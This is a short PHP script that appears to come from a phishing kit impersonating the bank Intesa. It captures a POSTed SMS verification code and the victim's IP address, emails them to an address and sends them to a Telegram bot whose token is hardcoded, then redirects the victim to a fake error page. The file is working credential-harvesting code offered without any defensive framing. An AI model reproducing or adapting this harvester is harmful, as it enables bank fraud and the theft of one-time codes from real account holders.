<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user'])){
$message  = "=========[BILLING INFO]=========\n";
$message .= "SMS loop  : ".$_POST['user']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BILLING INFO]=========";
$to="@gamers.com";
$subject = "PHONE INTESA [$ip]";
$headers = "From: INTESA <@web.de>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
		    $token = "7620796636:AAFpbNIADiQYRqgoFGF4kiNADAwDQqGfQPM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5052128612&text=" . urlencode($message)."" );
header("Location:../smserr.php");
}else{
header("Location:../smserr.php");
}

?>